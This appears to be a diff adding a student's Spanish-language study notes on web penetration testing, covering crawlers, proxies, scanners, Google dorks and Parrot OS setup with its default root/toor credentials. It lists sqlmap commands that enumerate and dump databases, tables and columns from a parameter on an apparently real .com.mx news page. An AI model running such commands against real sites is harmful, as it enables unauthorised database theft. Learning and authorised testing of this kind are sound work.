@@ -1,0 +1,56 @@
+1982032412345
+
+0E9D2B79
+
+
+- crawler, herramienta que te permite encontrar directorios e items existentes de uan página web
+- spider, herramienta que sigue los enlaces, se puede usar para encontrar el submit dentro de una página web
+
+
+WEB PENTESTIGN
+Forma proactiva de hacer pruebas de pentración a un sitio o url.Puedes utilizarlo para hacer pruebas a sitios propios para evitar que alguien más lo decubra haciendo daño. Utilizaremos herramientas como Kali Linux, Parrot Security OS o Backtrack. Estas distribuciones vienen con un gran repertorio de herramientas de hacking.
+
+Vamos a actuar desde el punto de vista del atacante.
+
+- Herramientas importantes
+	- Proxies de aplicaciones web: Software que se coloca entre el navegador y el sitio web interceptando los paquetes que fluyen entre estos.
+	- Crawlers: Los "Rastreadores web" tratan de encontrar las guías ocultas en la aplicación web, lo que los hace realmente útiles son que recopilan mayor información y permiten realizar un pentest más provechoso.
+	- Scaners de vulnerabilidad: Después de la recopilacion de información , se procede a realizar la búsqueda de vulnerabilidades en aplicaciones web, en las distros con las que trabajaremos hay una varidad de herramientas tipo para la intrusión.
+
+
+En un login mal hecho, un password erroneo puede ocasionar errores de sintaxis que van a mostrarse en la interfaz de login. Dando inicio así a un posible ataque de sql injection
+
+
+SQL INYECTION
+	sqlmap -u "http://www.a.com.mx/noticias_sup.php?id=6" --dbs
+	sqlmap -u "http://www.a.com.mx/noticias_sup.php?id=6" -p id --current-user --current-db
+	sqlmap -u "http://www.a.com.mx/noticias_sup.php?id=6" -D base --tables
+	sqlmap -u "http://www.a.com.mx/noticias_sup.php?id=6" -D base -T tabla --columns
+	sqlmap -u "http://www.a.com.mx/noticias_sup.php?id=6" -D base -T tabla -C columna1,columna2,columna3 --dump	
+	sqlmap -u "http://www.a.com.mx/noticias_sup.php?id=6" -D base --sql-query="select now();"
+
+
+
+
+Dorks de google
+	Comandos de búsqueda de google
+		inurl
+
+
+
+
+
+
+
+
+Para parrot:
+- Other user
+	root
+	toor
+
+	Cambiar la configuración del adaptador de red a NAT (Maquina virtual, adaptador de red, NAT)
+
+	Abrir la terminal de parrot y correr el comando iceweasel
+	Configurar proxy (localhost)
+
+
